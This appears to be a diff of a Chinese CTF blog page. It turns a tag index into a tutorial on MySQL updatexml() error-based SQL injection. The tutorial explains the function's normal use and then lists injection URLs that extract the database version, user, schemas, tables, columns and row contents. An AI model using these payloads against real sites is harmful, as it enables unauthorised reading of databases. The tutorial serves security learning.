@@ -15,17 +15,26 @@
 
 
 
-<meta name="description" content="look look it">
-<meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="lexsd6.github.io/tags/index.html">
+<meta name="description" content="0x01updatexml()的正常作用updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于updatexml()报错注入的思考">
+<meta property="og:url" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/index.html">
 <meta property="og:site_name" content="lexsd6&#39;s home">
-<meta property="og:description" content="look look it">
+<meta property="og:description" content="0x01updatexml()的正常作用updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-05-01T09:07:41.000Z">
-<meta property="article:modified_time" content="2020-05-01T09:07:41.786Z">
+<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/updatexml1.PNG">
+<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200320235648716.png">
+<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321131351700.png">
+<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321002711168.png">
+<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321160707020.png">
+<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200321161640552.png">
+<meta property="og:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/image-20200324151215694.png">
+<meta property="article:published_time" content="2019-11-13T01:23:36.000Z">
+<meta property="article:modified_time" content="2020-05-14T16:07:11.303Z">
 <meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="mysql">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/updatexml1.PNG">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +68,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>tags | lexsd6&#39;s home</title>
+<title>关于updatexml()报错注入的思考 | lexsd6&#39;s home</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -69,7 +78,7 @@
         fancybox: true,
         animate: true,
         isHome: false,
-        isPost: false,
+        isPost: true,
         isArchive: false,
         isTag: false,
         isCategory: false,
@@ -263,11 +272,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-关于updatexml()报错注入的思考" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/tags/index.html" class="article-date">
-      <time datetime="2020-05-01T09:07:41.000Z" itemprop="datePublished">2020-05-01</time>
+      <a href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/" class="article-date">
+      <time datetime="2019-11-13T01:23:36.000Z" itemprop="datePublished">2019-11-13</time>
 </a>
 
 
@@ -282,7 +291,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      tags
+      关于updatexml()报错注入的思考
     </h1>
   
 
@@ -290,8 +299,16 @@
       
       <div class="article-info article-info-post">
         
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -299,96 +316,107 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-              <style>
-    .article-meta { display: none; }
-    #container .article .article-title { padding-right: 0; }
-    .article-header {
-        padding: 0;
-        padding-top: 26px;
-        border-left: none;
-        text-align: center;
-    }
-    .article-header:hover { border-left: none; }
-    .article-title { font-size: 1.6em }
-    .article-entry hr { margin: 0;}
-    .article-meta,
-    #container .article-info-post.article-info { display: none;}
-    #container .article .article-title { padding: 0; }
-</style>
+        <h2 id="0x01updatexml-的正常作用"><a href="#0x01updatexml-的正常作用" class="headerlink" title="0x01updatexml()的正常作用"></a>0x01updatexml()的正常作用</h2><p>updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。<a id="more"></a>其正常语法：<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
+<p>如下是关于它正常用法的掩饰。</p>
+<p>(1)执行如下sql语言创建环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE  xml1 (xxx VARCHAR(150));#创建一个表</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexsd6&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;frist xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第一个数据</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexs&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;secend xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第二个数据</span><br></pre></td></tr></table></figure>
 
+<p>(2) 使用<code>select * from xml1</code>查看</p>
+<p><img src="updatexml1.PNG" alt="updatexml1"></p>
+<p>（3）执行<code>SELECT updatexml(title,&#39;/values/text&#39;,&#39;one&#39;) FROM xml1;</code>语句。发现执行后，原来有<text>标签的地方连同标签里的内容都被替换成了‘one’。</p>
+<p><img src="image-20200320235648716.png" alt="image-20200320235648716"></p>
+<h2 id="0x02updatexml-报错注入的原因及注意点"><a href="#0x02updatexml-报错注入的原因及注意点" class="headerlink" title="0x02updatexml()报错注入的原因及注意点"></a>0x02updatexml()报错注入的原因及注意点</h2><p>由于updatexml的第二个参数需要<u><strong>Xpath</strong></u>格式的字符串,但如果在提交的不符合和Xpath格式,会用报错的形式将执行后的结果回显出了来.</p>
+<p>例如:执行sql语句<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>后,可以看到回显:</p>
+<p><img src="image-20200321131351700.png" alt="image-20200321131351700"></p>
+<p>如上图,原本<code>select database()</code>的地方被执行了,显示出数据库名–bookshop.</p>
+<p>在这里要注意的事：</p>
+<p>(1.)由于updatexml的保错回显只能返回一个属性，所以如果一个表中用多行，需要用‘limit’来限制行数（元组数）为一。</p>
+<p>(2.)在构建第二个参数时，要确保第二个参数不符合Xpath格式。有的函数符合Xpath格式可以用concat(‘不符合Xpath格式的字符串’,’要执行的恶意sql语句’)来构造’’</p>
+<p><img src="image-20200321002711168.png" alt="image-20200321002711168"></p>
+<p>(3.)若要注入出的数据格式就是xml结构的数据则可以直接在第二个参数select:</p>
+<p><img src="image-20200321160707020.png" alt="image-20200321160707020"></p>
+<p>(4.)用这个方法注出来的数据有长度限制。且在恶意代码前的参数字符越多，注出的有效信息越少。（如下图）.</p>
+<p><img src="image-20200321161640552.png" alt="image-20200321161640552"></p>
+<p>so在有一张表有多行时最好用limit 一行一行查询,慎重使用group_concat函数.(group_concat可能显示不全,用substr来截取拼接)</p>
+<p><img src="image-20200324151215694.png" alt="image-20200324151215694"></p>
+<h2 id="0x03updatexml-的注入"><a href="#0x03updatexml-的注入" class="headerlink" title="0x03updatexml()的注入"></a>0x03updatexml()的注入</h2><p>(1.)爆数据库版本信息</p>
+<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) ;#</p>
+<p>(2.)爆出用户</p>
+<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)  ;#</p>
+<p>(3.)爆出所用数据库</p>
+<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ；#</p>
+<p>(4.)爆全部数据库</p>
+<p><a href="http://www.hackblog.cn/sql.php?id=1" target="_blank" rel="noopener">http://www.hackblog.cn/sql.php?id=1</a> and uand  updatexml(1,concat(0x7e,(SELECT schema_name from information_schema.SCHEMATA  limit 0,1),0x7e),1);#</p>
+<p>(5.)爆表<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);#</p>
+<p>(6.)爆字段</p>
+<p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_name=’xml1’ limit 0,1),0x7e),1);#</p>
+<p>(7.)爆字段内容<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and  updatexml(1,concat(0x7e,(SELECT  title from xml1 limit 0,1),0x7e),1);#</p>
 
-    <!-- Tag Cloud Page -->
-    <hr>
-<br>
-<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">3</span></li></ul>
-
-<p class="count"></p>
-
-<div class="tags">
-    <a href="/tags/mysql/" style="font-size: 16px; color: #808080">mysql</a> <a href="/tags/php/" style="font-size: 16px; color: #808080">php</a> <a href="/tags/python/" style="font-size: 16px; color: #808080">python</a> <a href="/tags/web/" style="font-size: 35px; color: #000">web</a>
-</div>
-<style>
-    .category-list li{
-        display: inline-block;
-        margin: 0 1em .5em 0;
-        padding: 4px;
-        border: 1px solid lightgray;
-        font-size: 1.2rem;
-    }
-    .category-list a { color: gray; }
-    .category-list-item:hover a {
-        color: gray;
-        text-decoration: none;
-    }
-    .category-list-count {
-        margin-left: 2px;
-        font-size: .9rem;
-    }
-    .article-entry ul li:before{ display: none; }
-    .article-inner { text-align: center; }
-    .tags {
-        max-width: 42em;
-        margin: 2em auto;
-        margin-top: 0em;
-    }
-    .tags a {
-        margin-right: 1em;
-        line-height: 65px;
-        border-bottom: 1px solid gray;
-        white-space: nowrap;
-        transition: border-bottom .5s;
-    }
-    .tags a:hover {
-        border-bottom: 3px dotted gray;
-        text-decoration: none;
-    }
-    #count > span {
-        margin: auto .2em;
-        font-weight: bold;
-    }
-</style>
-
-<!-- Count tags and categories -->
-<p id="count">
-        已有<span><script>document.write($(".category-list-item").length)</script></span>个分类，
-        共计<span><script>document.write($(".tags > a").length)</script></span>个标签
-</p>
-<script>
-    $('#count').appendTo('.count');
-</script>
-
-          
-        
       
     </div>
     
   </div>
   
     
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
+        <p><span>发布时间:</span>2019-11-13, 09:23:36</p>
+        <p><span>最后更新:</span>2020-05-15, 00:07:11</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/" title="关于updatexml()报错注入的思考">lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
 
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">
+                    关于python沙盒逃逸的思考
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/10/03/hello-world/">
+                    Hello World
+                </a>
+            </div>
+        
+    </nav>
 
   
 </article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01updatexml-的正常作用"><span class="toc-text">0x01updatexml()的正常作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02updatexml-报错注入的原因及注意点"><span class="toc-text">0x02updatexml()报错注入的原因及注意点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03updatexml-的注入"><span class="toc-text">0x03updatexml()的注入</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
 
 
 
@@ -406,7 +434,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"tags　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"关于updatexml()报错注入的思考　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -421,6 +449,26 @@
 
     
 
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/" title="上一篇: 关于python沙盒逃逸的思考">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/10/03/hello-world/" title="下一篇: Hello World">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python沙盒逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/hello-world/">Hello World</a></li></ul>
 
 
 
